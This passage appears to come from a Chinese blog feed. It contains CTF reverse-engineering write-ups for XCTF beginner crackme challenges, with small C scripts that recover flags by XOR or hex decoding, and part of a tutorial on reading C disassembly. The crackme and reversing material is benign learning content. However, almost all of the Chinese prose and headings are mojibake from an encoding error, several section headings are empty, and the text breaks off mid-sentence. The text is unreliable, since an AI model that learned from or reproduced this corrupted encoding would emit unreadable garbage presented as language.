alt="-w555"><br>ï¼ˆåªæ˜¯æˆªå–ä¸€éƒ¨åˆ†ï¼‰åˆ†æå¯ä»¥å¾—çŸ¥æ˜¯åˆ†æˆäº†2ä¸ªå­—ç¬¦æ•°ç»„ï¼Œä¸€ä¸ªV2åˆ°V58ï¼Œä¸€ä¸ªV59åˆ°V115ï¼Œéƒ½æ˜¯56çš„é•¿åº¦ï¼Œç„¶åä¸‹é¢å°±æ˜¯ä¸¤ä¸ªå¼‚æˆ–æ“ä½œäº†ã€‚ç›´æ¥æ”¹æˆCä»£ç ï¼Œå› ä¸ºè¿˜ä¸ä¼šå†™Pythonã€‚</p><pre><code>#include &lt;iostream&gt;#include &lt;string.h&gt;int main() {        int i;        char arr1[]={123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0};        char arr2[]={18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0};        for ( i = 0; i &lt; 56; ++i )        {            arr1[i] ^= arr2[i];            arr1[i] ^= 0x13u;        }        printf(&quot;%s&quot;,arr1);    return 0;}</code></pre><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733139966832.jpg" srcset="/img/loading.gif" alt="-w734"><br>è¿è¡Œå°±æ‹¿åˆ°äº†flagã€‚</p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p>æ ¹æ®é¢˜ç›®æè¿°ï¼šèœé¸¡å‘ç°Flagä¼¼ä¹å¹¶ä¸ä¸€å®šæ˜¯æ˜æ–‡æ¯”è¾ƒçš„<br>è‚¯å®šæ˜¯è¿›è¡Œäº†æŸç§åŠ å¯†ã€‚</p><h3 id="å…ˆæŸ¥å£³"><a href="#å…ˆæŸ¥å£³" class="headerlink" title="å…ˆæŸ¥å£³"></a>å…ˆæŸ¥å£³</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733878960896.jpg" srcset="/img/loading.gif" alt="-w544"><br>æ— å£³ï¼Œ32ä½c++ç¨‹åº</p><h3 id="è¿è¡Œç¨‹åº"><a href="#è¿è¡Œç¨‹åº" class="headerlink" title="è¿è¡Œç¨‹åº"></a>è¿è¡Œç¨‹åº</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733879199369.jpg" srcset="/img/loading.gif" alt="-w431"><br>è¾“å…¥æ­£ç¡®çš„serialï¼Œä¼šæç¤ºæ­£ç¡®ã€‚</p><h3 id="IDAé™æ€åˆ†æ"><a href="#IDAé™æ€åˆ†æ" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733881777919.jpg" srcset="/img/loading.gif" alt="-w602"><br>è¿›å…¥mainå‡½æ•°ï¼ŒF5å¤§æ³•æŸ¥çœ‹ä¼ªä»£ç <br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733882559724.jpg" srcset="/img/loading.gif" alt="-w511"><br>å‘ç°æ˜¯v10æ•°ç»„ä¸v13æ•°ç»„é€å¯¹æ¯”åï¼Œå¦‚æœç›¸åŒå°±ä¼šè¾“å‡ºæ­£ç¡®çš„å­—çœ¼ã€‚å‰é¢æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„v9è¿›è¡Œä¸€äº›å¤„ç†ï¼Œå¤„ç†å®Œåä¼šæ”¾å…¥v10ä¸­ã€‚ä¸‹é¢å…·ä½“åˆ†æä¸€ä¸‹å¦‚ä½•å¤„ç†å°±å¯ä»¥äº†ï¼Œä¸»è¦åœ¨sprintfå‡½æ•°å’Œstrcatå‡½æ•°ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733887654757.jpg" srcset="/img/loading.gif" alt="-w379"><br>ç‚¹å‡»è¿›å»çœ‹åˆ°<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733887851687.jpg" srcset="/img/loading.gif" alt="-w555"><br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733888354402.jpg" srcset="/img/loading.gif" alt="-w632"><br>é‚£å°±å¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯æŠŠv4å­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯åˆšåˆšè¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œæ ¼å¼åŒ–ä½16è¿›åˆ¶çš„æ•´æ•°è¾“å‡ºåˆ°v8ä¸­ï¼Œç„¶åç”¨strcatå‡½æ•°æŠŠå¤„ç†åçš„v8æ”¾å…¥v10ã€‚ï¼ˆæ­¤å¤„åŸæ¥çš„v10æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥è¿æ¥v10å’Œv8ï¼Œå®é™…ç›¸å½“äºæŠŠv8æ”¾å…¥v10ï¼‰</p><p>æ¥ä¸‹æ¥å°±æ˜¯v10ä¸v13è¿›è¡Œå¯¹æ¯”ï¼Œv13æ˜¯åˆšåˆšå¤åˆ¶è¿‡æ¥çš„<code>437261636b4d654a757374466f7246756e</code>ï¼Œé‚£å°±å¯ä»¥çœ‹å‡ºæ¥å’±ä»¬ç›´æ¥æŠŠè¿™ä¸ªè¿›è¡Œ16è¿›åˆ¶è½¬å›å»å°±å¯ä»¥äº†ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733891570437.jpg" srcset="/img/loading.gif" alt="-w526"></p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>è¿™é“é¢˜æ˜¯æ‹¿åˆ°äº†ä¸€æ®µcæºç ï¼Œæ‰“å¼€å‘ç°å…³é”®å¤„ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733897127019.jpg" srcset="/img/loading.gif" alt="-w1023"><br>å¯ä»¥çœ‹å‡ºæ¥æŠŠ<code>first second strlen(argv[3])</code>ææ¸…æ¥šæ˜¯ä»€ä¹ˆå°±å¯ä»¥äº†ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733897938110.jpg" srcset="/img/loading.gif" alt="-w590"><br>å¾ˆç®€å•å¯ä»¥çœ‹å‡ºè¿™3ä¸ªæ˜¯ä»€ä¹ˆå€¼ï¼Œä¸‹é¢ç›´æ¥æ”¾è§£å¯†ä»£ç ï¼š</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;iostream&gt;int main(int argc, char *argv[]) {    unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207;    printf(&quot;Get your key: &quot;);    printf(&quot;%x\n&quot;, hash);    return 0;}</code></pre><p>æ‹¿åˆ°flagï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733900988974.jpg" srcset="/img/loading.gif" alt="-w603"></p><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªçœ‹é¢˜ç›®å°±æ˜¯çŸ¥é“åŠ äº†å£³ã€‚ä¸”æ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸¢è¿›edbçœ‹ä¸€ä¸‹ã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733910805939.jpg" srcset="/img/loading.gif" alt="-w685"></p><p>å•æ­¥è°ƒè¯•èµ°ä¸€ä¼šï¼Œåœ¨å¯„å­˜å™¨çª—å£çœ‹åˆ°ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733910639998.jpg" srcset="/img/loading.gif" alt="-w1019"><br>è¿™å¾ˆæ˜æ˜¾æ˜¯åŠ äº†UPXå£³ã€‚</p><h3 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733911418603.jpg" srcset="/img/loading.gif" alt="-w733"><br>è¿™é‡Œå°±ç”¨<code>upx -d</code>ç›´æ¥ä¸€é”®è„±å£³ã€‚ä»¥åå¯ä»¥ç»ƒä¹ æ‰‹åŠ¨è„±upxå£³ã€‚<br>è„±å£³å®Œæˆåç”¨IDAè¿›è¡Œåˆ†æï¼š</p><h3 id="IDAé™æ€åˆ†æ-1"><a href="#IDAé™æ€åˆ†æ-1" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15733913704154.jpg" srcset="/img/loading.gif" alt="-w617"><br>æ‰“å¼€ç›´æ¥å‡ºç°äº†flagï¼Œè¿™ä¸ªé¢˜å°±è€ƒä¸ªè¯†åˆ«å£³å’Œupxè„±å£³äº†ã€‚</p><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741646328276.jpg" srcset="/img/loading.gif" alt="-w569"><br>å…ˆæŸ¥çœ‹ä¸€ä¸‹ï¼Œæ— å£³ï¼Œelf 64ä½åº”ç”¨ã€‚</p><h3 id="IDAé™æ€åˆ†æ-2"><a href="#IDAé™æ€åˆ†æ-2" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741650120350.jpg" srcset="/img/loading.gif" alt="-w442"><br>ç‚¹å‡»æ­¤å¤„å‡ºç°äº†ï¼š<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741650432513.jpg" srcset="/img/loading.gif" alt="-w493"><br>ç¡®è®¤å…³é”®ä»£ç æ®µã€‚å¼€å§‹å¯¹è¿™ä¸ªå¾ªç¯è¿›è¡Œåˆ†æï¼Œéœ€è¦å¯¹v8 v7 v9é‡ç‚¹åˆ†æã€‚<br><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741657131708.jpg" srcset="/img/loading.gif" alt="-w1026"><br>è¿™é‡Œé¢éš¾ç‚¹å°±åœ¨å¦‚ä½•å¯¹v8çš„ç†è§£ã€‚</p><h3 id="v8ä¸å…³é”®åŠ å¯†åˆ†æ"><a href="#v8ä¸å…³é”®åŠ å¯†åˆ†æ" class="headerlink" title="v8ä¸å…³é”®åŠ å¯†åˆ†æ"></a>v8ä¸å…³é”®åŠ å¯†åˆ†æ</h3><p>v8æ˜¯ä¸€ä¸ª_int64ä¹Ÿå°±æ˜¯long longç±»å‹çš„æ•°å€¼ï¼Œå…¶å­˜å…¥å†…å­˜éœ€è¦å˜æˆ16è¿›åˆ¶çš„æ•°å€¼å­˜å…¥ã€‚<img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741666120370.jpg" srcset="/img/loading.gif" alt="-w496"><br>åˆšåˆšæˆ‘ä»¬æ³¨æ„åˆ°è¿™ä¸ªx86æ¡†æ¶x64çš„ç¨‹åºï¼Œå…¶åœ¨å†…å­˜æ˜¯ç”¨å°ç«¯åºå­˜å…¥çš„ï¼Œä¹Ÿå°±æ˜¯åœ°å€é«˜ä½æ”¾æ•°å€¼é«˜ä½ï¼Œåœ°å€ä½ä½æ”¾åœ°å€ä½ä½ã€‚é‚£ä¹ˆå…¶æ”¾å¥½å°±æ˜¯<img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741662400799.jpg" srcset="/img/loading.gif" alt="-w226"><br>æ­£å¥½æ˜¯åè¿‡æ¥çš„ã€‚<br>ç„¶ååˆ†æä¸€ä¸‹åŠ å¯†ä»£ç ï¼Œè¿™ä¸»è¦å°±æ˜¯æŒ‡é’ˆçŸ¥è¯†äº†ï¼š<br><code>v4 = (unsigned int)(char)(*((_BYTE *)&amp;v8 + i % v7) ^ v9[i]);</code><br>è¿™é‡Œçš„ï¼ˆcharï¼‰æ˜¯ç»™long longå¼ºåˆ¶è½¬å‹ï¼Œç„¶åä¸ºäº†åé¢çš„ä»¥2ä½16è¿›åˆ¶æ•°ä¹Ÿå°±æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œæ¥è¯»å–æ•°å€¼ã€‚<code>i % v7</code>å…¶æ˜¯å°±æ˜¯æ§åˆ¶i = 0â€”6æ­£å¥½æŠŠè¿™ä¸ªv8ç»™æ­£ç¡®è¯»å–å®Œã€‚ç„¶åä¸€ä½ä½å–å®Œv8åå¼€å§‹è·Ÿv9å¼‚æˆ–ã€‚</p><h3 id="è„šæœ¬è§£å¯†"><a href="#è„šæœ¬è§£å¯†" class="headerlink" title="è„šæœ¬è§£å¯†"></a>è„šæœ¬è§£å¯†</h3><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    int v6;    char v7[]=&quot;harambe&quot;;    v6 = 7;    char v8[18];    strcpy(v8, &quot;:\&quot;AL_RT^L*.?+6/46&quot;);    char s[18];    int i;    for ( i = 0; i &lt; strlen(v8); ++i) {        s[i] =v7[i%v6]^v8[i];    }    for (int j = 0; j &lt; strlen(v8); ++j) {        printf(&quot;%c&quot;,s[j]);    }    return 0;}</code></pre><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741669073968.jpg" srcset="/img/loading.gif" alt="-w402"></p><h3 id="å¯¹äºå¤§å°ç«¯åºçš„çŸ¥è¯†è¡¥å……"><a href="#å¯¹äºå¤§å°ç«¯åºçš„çŸ¥è¯†è¡¥å……" class="headerlink" title="å¯¹äºå¤§å°ç«¯åºçš„çŸ¥è¯†è¡¥å……"></a>å¯¹äºå¤§å°ç«¯åºçš„çŸ¥è¯†è¡¥å……</h3><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741673443772.jpg" srcset="/img/loading.gif" alt="-w718"><br>æ•°æ®ç±»å‹ä¸ºå­—èŠ‚å‹( BYTE)æ—¶ï¼Œå…¶é•¿åº¦ä¸º1ä¸ªå­—èŠ‚,ä¿å­˜è¿™æ ·çš„æ•°æ®æ—¶ï¼Œæ— è®ºé‡‡ç”¨å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºï¼Œå­—èŠ‚é¡ºåºéƒ½æ˜¯ä¸€æ ·çš„ã€‚<strong>ä½†æ˜¯æ•°æ®é•¿åº¦ä¸º2ä¸ªå­—èŠ‚ä»¥ä¸Š(å«2ä¸ªå­—èŠ‚)æ—¶ï¼Œé‡‡ç”¨ä¸åŒå­—èŠ‚åºä¿å­˜å®ƒä»¬å½¢æˆçš„å­˜å‚¨é¡ºåºæ˜¯ä¸åŒçš„ã€‚é‡‡ç”¨å¤§ç«¯åºå­˜å‚¨æ•°æ®æ—¶ï¼Œå†…å­˜åœ°å€ä½ä½å­˜å‚¨æ•°æ®çš„é«˜ä½ï¼Œå†…å­˜åœ°å€é«˜ä½å­˜å‚¨æ•°æ®çš„ä½ä½ï¼Œè¿™æ˜¯ä¸€ç§æœ€ç›´è§‚çš„å­—èŠ‚å­˜å‚¨é¡ºåº;é‡‡ç”¨å°ç«¯åºå­˜å‚¨æ•°æ®æ—¶,åœ°å€é«˜ä½å­˜å‚¨æ•°æ®çš„é«˜ä½ï¼Œåœ°å€ä½ä½å­˜å‚¨æ•°æ®çš„ä½ä½ï¼Œè¿™æ˜¯ä¸€ç§é€†åºå­˜å‚¨æ–¹å¼ï¼Œä¿å­˜çš„å­—èŠ‚é¡ºåºè¢«å€’è½¬ï¼Œå®ƒæ˜¯æœ€ç¬¦åˆäººç±»æ€ç»´çš„å­—èŠ‚åºã€‚</strong></p><p><strong>å¼ºè°ƒ</strong>ï¼šåªæœ‰æ•°æ®é•¿åº¦åœ¨2ä¸ªå­—èŠ‚ä»¥ä¸Šæ—¶ï¼Œå³æ•°æ®ä¸ºå¤šå­—èŠ‚æ•°æ®æ—¶ï¼Œé€‰ç”¨å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºä¼šå¯¼è‡´æ•°æ®çš„å­˜å‚¨é¡ºåºä¸åŒã€‚å­—ç¬¦ä¸²â€œabcdeâ€ è¢«ä¿å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ ( Char )æ•°ç»„strä¸­,å­—ç¬¦æ•°ç»„åœ¨å†…å­˜ä¸­æ˜¯è¿ç»­çš„ï¼Œæ­¤æ—¶å‘å­—ç¬¦æ•°ç»„å­˜æ”¾æ•°æ®ï¼Œæ— è®ºé‡‡ç”¨å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºï¼Œå­˜å‚¨é¡ºåºéƒ½ç›¸åŒã€‚</p><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p><img src="/2019/11/09/Xctfre_æ–°æ‰‹åŒºwp/images/15741680757822.jpg" srcset="/img/loading.gif" alt="-w764"><br>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œä¸»å‡½æ•°ç‚¹å‡»ä¸€ä¸‹ä»–è¦æ‰“å°çš„å­—ç¬¦ä¸²å°±å¯ä»¥çœ‹åˆ°äº†flagï¼Œå½“ç„¶shift + f12ä¹Ÿæ˜¯å¯ä»¥çœ‹åˆ°ã€‚</p><h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h2><h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰</title>
    <link href="/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¬¡ä¸»è¦å­¦ä¹ ä»¥ä¸‹å†…å®¹</p><ol><li>å†…å­˜å›¾</li><li>å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡</li><li>å‡½æ•°å‚æ•°çš„åˆ†æ</li><li>åˆ†æ”¯è¯­å¥:<code>if</code> <code>if...else...</code> <code>if..else if..else if....else</code>åˆ†æ”¯è¯­å¥çš„åµŒå¥—ä½¿ç”¨``çš„æ­£å‘ä¸é€†å‘åˆ†æ</li></ol><h2 id="å†…å­˜å›¾"><a href="#å†…å­˜å›¾" class="headerlink" title="å†…å­˜å›¾"></a>å†…å­˜å›¾</h2><p><img src="/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/images/15718432593875.jpg" srcset="/img/loading.gif" alt="-w301"><br>åœ¨ç”µè„‘ä¸­ä»»ä½•ä¸€ä¸ªç¨‹åºè¿è¡Œæ—¶ï¼Œå…¶ä¼šåœ¨å†…å­˜ä¸­åˆ†æˆä»¥ä¸Šå›¾ä¸­çš„å‡ ä¸ªåŒºåŸŸã€‚è¯¦ç»†æ¯ä¸ªåŒºæ˜¯æ€ä¹ˆæ ·çš„ï¼Œç›´æ¥çœ‹å›¾å³å¯ã€‚</p><h2 id="å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡"><a href="#å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡" class="headerlink" title="å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡"></a>å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡</h2><pre><code>int g_n = 10; //å…¨å±€å˜é‡int Funcation() //ä»£ç åŒºï¼Œè°ƒç”¨æ—¶æ‰§è¡Œ{    int x = 1;//å±€éƒ¨å˜é‡    int y = 3;    return g_n+x+y;    }}</code></pre><p>å°±ç”¨è¿™ä¸ªä»£ç æ®µæ¥åˆ†æã€‚</p><h3 id="å…¨å±€å˜é‡çš„ç‰¹ç‚¹"><a href="#å…¨å±€å˜é‡çš„ç‰¹ç‚¹" class="headerlink" title="å…¨å±€å˜é‡çš„ç‰¹ç‚¹"></a>å…¨å±€å˜é‡çš„ç‰¹ç‚¹</h3><p>1ã€å…¨å±€å˜é‡åœ¨ç¨‹åºç¼–è¯‘å®Œæˆååœ°å€å°±å·²ç»ç¡®å®šä¸‹æ¥äº†ï¼Œ<strong>åªè¦ç¨‹åºå¯åŠ¨ï¼Œå…¨å±€å˜é‡å°±å·²ç»å­˜åœ¨äº†</strong>ï¼Œå¯åŠ¨åé‡Œé¢æ˜¯å¦æœ‰å€¼å–å†³äºå£°æ˜æ—¶æ˜¯å¦ç»™å®šäº†åˆå§‹å€¼ï¼Œå¦‚æœæ²¡æœ‰ï¼Œé»˜è®¤ä¸º0ã€‚<br>2ã€å…¨å±€å˜é‡çš„å€¼å¯ä»¥è¢«æ‰€æœ‰å‡½æ•°æ‰€ä¿®æ”¹ï¼Œé‡Œé¢å­˜å‚¨çš„æ˜¯æœ€åä¸€æ¬¡ä¿®æ”¹çš„å€¼.<br>3ã€å…¨å±€å˜é‡æ‰€å å†…å­˜ä¼šä¸€ç›´å­˜åœ¨ï¼ŒçŸ¥é“æ•´ä¸ªè¿›ç¨‹ç»“æŸ.<br>4ã€å…¨å±€å˜é‡çš„åæ±‡ç¼–è¯†åˆ«ï¼š<code>MOV å¯„å­˜å™¨,byte/word/dword ptr ds:[0x12345678]</code><br>é€šè¿‡å¯„å­˜å™¨çš„å®½åº¦ï¼Œæˆ–è€…byte/word/dword æ¥åˆ¤æ–­å…¨å±€å˜é‡çš„å®½åº¦.<strong>å…¨å±€å˜é‡å°±æ˜¯æ‰€è°“çš„åŸºå€</strong>ã€‚</p><h3 id="å±€éƒ¨å˜é‡çš„ç‰¹ç‚¹"><a href="#å±€éƒ¨å˜é‡çš„ç‰¹ç‚¹" class="headerlink" title="å±€éƒ¨å˜é‡çš„ç‰¹ç‚¹"></a>å±€éƒ¨å˜é‡çš„ç‰¹ç‚¹</h3><p>1ã€å±€éƒ¨å˜é‡åœ¨ç¨‹åºç¼–è¯‘å®Œæˆåå¹¶æ²¡æœ‰åˆ†é…å›ºå®šçš„åœ°å€.ï¼ˆå› ä¸ºè®¡ç®—æœºä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸ä¼šæå‰åˆ†é…å¥½ï¼‰<br>2ã€åœ¨æ‰€å±çš„æ–¹æ³•æ²¡æœ‰è¢«è°ƒç”¨æ—¶ï¼Œå±€éƒ¨å˜é‡å¹¶ä¸ä¼šåˆ†é…å†…å­˜åœ°å€ï¼Œåªæœ‰å½“æ‰€å±çš„ç¨‹åºè¢«è°ƒç”¨äº†ï¼Œæ‰ä¼šåœ¨å †æ ˆä¸­åˆ†é…å†…å­˜.<br>3ã€å½“å±€éƒ¨å˜é‡æ‰€å±çš„å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå±€éƒ¨å˜é‡æ‰€å ç”¨çš„å†…å­˜å°†å˜æˆåƒåœ¾æ•°æ®.å±€éƒ¨å˜é‡æ¶ˆå¤±.<br>4ã€å±€éƒ¨å˜é‡åªèƒ½åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨ï¼Œå‡½æ•°Aæ— æ³•ä½¿ç”¨å‡½æ•°Bçš„å±€éƒ¨å˜é‡.ï¼ˆä»å †æ ˆå›¾ä¸­ä¹Ÿå¯ä»¥æƒ³è±¡çš„åˆ°åŸç†ï¼‰<br>5ã€å±€éƒ¨å˜é‡çš„åæ±‡ç¼–è¯†åˆ«ï¼š<code>[ebp-4]</code>[ebp-8]<code>[ebp-0xC]</code>ç­‰ç­‰ç±»ä¼¼çš„æƒ…å½¢ã€‚</p><h2 id="å‡½æ•°å‚æ•°çš„åˆ†æ"><a href="#å‡½æ•°å‚æ•°çš„åˆ†æ" class="headerlink" title="å‡½æ•°å‚æ•°çš„åˆ†æ"></a>å‡½æ•°å‚æ•°çš„åˆ†æ</h2><p>å¦‚ä½•åˆ¤æ–­å‡½æ•°æœ‰å‡ ä¸ªå‚æ•°ï¼Œå·²ç»åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>ä¸€èˆ¬æƒ…å†µï¼š<br>    æ­¥éª¤ä¸€ï¼šè§‚å¯Ÿè°ƒç”¨å¤„çš„ä»£ç <br>    push    3<br>    push    2<br>    push    1<br>    call    0040100f</p><p>æ­¥éª¤äºŒï¼šæ‰¾åˆ°å¹³è¡¡å †æ ˆçš„ä»£ç ç»§ç»­è®ºè¯</p><pre><code>call    0040100fadd     esp,0Ch</code></pre><p>æˆ–è€…å‡½æ•°å†…éƒ¨</p><pre><code>ret 4/8/0xC/0x10</code></pre><p>æœ€åï¼Œä¸¤è€…ä¸€ç»¼åˆï¼Œå‡½æ•°çš„å‚æ•°ä¸ªæ•°åŸºæœ¬ç¡®å®š.å¯ä»¥åº”å¯¹ç™¾åˆ†ä¹‹å…«åçš„æƒ…å†µã€‚</p><p>ä½†å‰©ä¸‹çš„ç™¾åˆ†ä¹‹äºŒåå‘¢ï¼Ÿ<br>ä¸Šé¢çš„åˆ†æå­˜åœ¨çš„é—®é¢˜ï¼š<br>1ã€<strong>å‚æ•°ä¼ é€’æœªå¿…éƒ½æ˜¯é€šè¿‡å †æ ˆï¼Œè¿˜å¯èƒ½é€šè¿‡ä½¿ç”¨å¯„å­˜å™¨</strong>.<br>ä¾‹ï¼š</p><pre><code>push ebxpush eaxmov ecx,dword ptr ds:[esi]mov edx,dword ptr ds:[edi]push 45push 33call å‡½æ•°åœ°å€</code></pre><p>2ã€<strong>å‡½æ•°è°ƒç”¨å¤„çš„ä»£ç æ— æ³•æŸ¥çœ‹.</strong><br>ä¾‹ï¼š<br>è¿›å…¥å‡½æ•°æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼š</p><pre><code>00401050   push         ebp00401051   mov         ebp,esp00401053   sub         esp,48h00401056   push        ebx00401057   push        esi00401058   push        edi    00401059   push        ecx    0040105A   lea         edi,[ebp-48h]0040105D   mov         ecx,12h00401062   mov         eax,0CCCCCCCCh00401067   rep stos    dword ptr [edi]00401069   pop         ecx    0040106A   mov         dword ptr [ebp-8],edx0040106D   mov         dword ptr [ebp-4],ecx00401070   mov         eax,dword ptr [ebp-4]00401073   add         eax,dword ptr [ebp-8]00401076   add         eax,dword ptr [ebp+8]00401079   mov         [g_x (00427958)],eax0040107E   pop         edi    0040107F   pop         esi    00401080   pop         ebx    00401081   mov         esp,ebp00401083   pop         ebp    00401084   ret         4        </code></pre><p>è§‚å¯Ÿæ­¥éª¤ï¼š<br>1ã€ä¸è€ƒè™‘ebpã€esp<br>2ã€åªæ‰¾ç»™åˆ«äººèµ‹å€¼çš„å¯„å­˜å™¨<br>eax/ecx/edx/ebx/esi/edi<br>3ã€æ‰¾åˆ°ä»¥åè¿½æŸ¥å…¶æ¥æºï¼Œå¦‚æœï¼Œè¯¥å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œä¸æ˜¯åœ¨å‡½æ•°å†…å­˜èµ‹å€¼çš„ï¼Œé‚£ä¸€å®šæ˜¯ä¼ è¿›æ¥çš„å‚æ•°.<br>**å…¬å¼ä¸€ï¼šå¯„å­˜å™¨ + ret 4\8\0C = å‚æ•°ä¸ªæ•°<br>å…¬å¼äºŒï¼šå¯„å­˜å™¨ + [ebp+8]+[ebp+0x] = å‚æ•°ä¸ªæ•°**<br>è¿™ä¸¤ä¸ªå…¬å¼å¯ä»¥äº’ç›¸ç»“åˆéªŒè¯çœ‹æ˜¯å¦ç®—çš„å¯¹ã€‚<br>å¦‚ä»¥ä¸Šä»£ç æ®µï¼Œåªå¯ä»¥æ‰¾åˆ°<code>edi,ecx,edx</code>ç»™åˆ«äººèµ‹å€¼ï¼Œä½†æ˜¯å…¶ä¸­<code>edi ecx</code>éƒ½æ˜¯å‡½æ•°å†…å­˜èµ‹çš„å€¼ï¼Œæ‰€ä»¥åªå‰©ä¸‹<code>edx</code>ï¼Œåœ¨åŠ ä¸Šæœ€åçš„<code>ret 